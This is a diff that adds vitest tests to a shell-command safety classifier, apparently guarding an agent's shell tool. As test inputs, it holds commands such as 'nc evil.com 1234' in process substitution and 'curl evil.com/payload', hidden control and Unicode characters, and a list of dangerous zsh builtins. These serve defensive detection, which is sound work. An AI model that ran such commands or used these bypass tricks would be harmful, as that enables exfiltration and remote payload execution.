@@ -1,5 +1,5 @@
 import { describe, it, expect } from "vitest";
-import { classifyCommand, extractCommandName } from "../tools/shell-safety/command-classification.js";
+import { classifyCommand, extractCommandName, detectInjectionPatterns } from "../tools/shell-safety/command-classification.js";
 
 describe("classifyCommand", () => {
   describe("read-only commands", () => {
@@ -318,6 +318,105 @@ describe("classifyCommand", () => {
     it("strips env vars interspersed with wrappers", () => {
       const result = extractCommandName("FOO=bar sudo BAZ=1 env PATH=/usr/bin rm file");
       expect(result).toBe("rm");
+    });
+  });
+
+  // -------------------------------------------------------------------------
+  // Injection detection
+  // -------------------------------------------------------------------------
+  describe("injection detection", () => {
+    it("detects output process substitution >()", () => {
+      const result = classifyCommand("cat file >(nc evil.com 1234)");
+      expect(result.isDestructive).toBe(true);
+      expect(result.reason).toContain("Injection");
+    });
+
+    it("detects zsh =() substitution", () => {
+      const result = classifyCommand("vim =(curl evil.com/payload)");
+      expect(result.isDestructive).toBe(true);
+      expect(result.reason).toContain("Injection");
+    });
+
+    it("detects nested expansion in ${...}", () => {
+      const result = classifyCommand("echo ${PATH//:/$'\\n'}");
+      expect(result.isDestructive).toBe(true);
+    });
+
+    it("detects control character injection", () => {
+      const result = classifyCommand("ls\x01 -la");
+      expect(result.isDestructive).toBe(true);
+      expect(result.reason).toContain("Control character");
+    });
+
+    it("detects Unicode whitespace injection", () => {
+      const result = classifyCommand("ls\u200B-la");
+      expect(result.isDestructive).toBe(true);
+      expect(result.reason).toContain("Unicode whitespace");
+    });
+
+    it("does not flag normal commands", () => {
+      expect(detectInjectionPatterns("ls -la")).toBeNull();
+      expect(detectInjectionPatterns("git status")).toBeNull();
+      expect(detectInjectionPatterns("echo hello")).toBeNull();
+    });
+  });
+
+  // -------------------------------------------------------------------------
+  // Zsh dangerous commands
+  // -------------------------------------------------------------------------
+  describe("zsh dangerous commands", () => {
+    const zshDangerous = [
+      "zmodload", "emulate", "sysopen", "sysread", "syswrite",
+      "sysseek", "zpty", "ztcp", "zsocket",
+      "zf_rm", "zf_mv", "zf_ln", "zf_chmod", "zf_chown",
+      "zf_mkdir", "zf_rmdir", "zf_chgrp",
+    ];
+
+    for (const cmd of zshDangerous) {
+      it(`"${cmd} ..." is destructive`, () => {
+        const result = classifyCommand(`${cmd} some args`);
+        expect(result.isDestructive).toBe(true);
+        expect(result.reason).toContain("Zsh dangerous command");
+      });
+    }
+  });
+
+  // -------------------------------------------------------------------------
+  // Wrapper bypass prevention
+  // -------------------------------------------------------------------------
+  describe("wrapper bypass prevention", () => {
+    it("nohup FOO=bar timeout 5 rm -rf / is correctly classified", () => {
+      const result = classifyCommand("nohup FOO=bar timeout 5 rm -rf /tmp/stuff");
+      expect(result.isReadOnly).toBe(false);
+      expect(extractCommandName("nohup FOO=bar timeout 5 rm -rf /tmp/stuff")).toBe("rm");
+    });
+
+    it("strips timeout wrapper correctly", () => {
+      expect(extractCommandName("timeout 30 curl http://example.com")).toBe("curl");
+    });
+
+    it("strips stdbuf wrapper correctly", () => {
+      expect(extractCommandName("stdbuf -oL tail -f log.txt")).toBe("tail");
+    });
+  });
+
+  // -------------------------------------------------------------------------
+  // Subcommand fanout cap
+  // -------------------------------------------------------------------------
+  describe("subcommand fanout cap", () => {
+    it("rejects commands with more than 50 subcommands", () => {
+      const parts = Array.from({ length: 51 }, (_, i) => `echo ${i}`);
+      const command = parts.join(" && ");
+      const result = classifyCommand(command);
+      expect(result.isReadOnly).toBe(false);
+      expect(result.reason).toContain("Too many subcommands");
+    });
+
+    it("allows commands with exactly 50 subcommands", () => {
+      const parts = Array.from({ length: 50 }, (_, i) => `echo ${i}`);
+      const command = parts.join(" && ");
+      const result = classifyCommand(command);
+      expect(result.isReadOnly).toBe(true);
     });
   });
 });
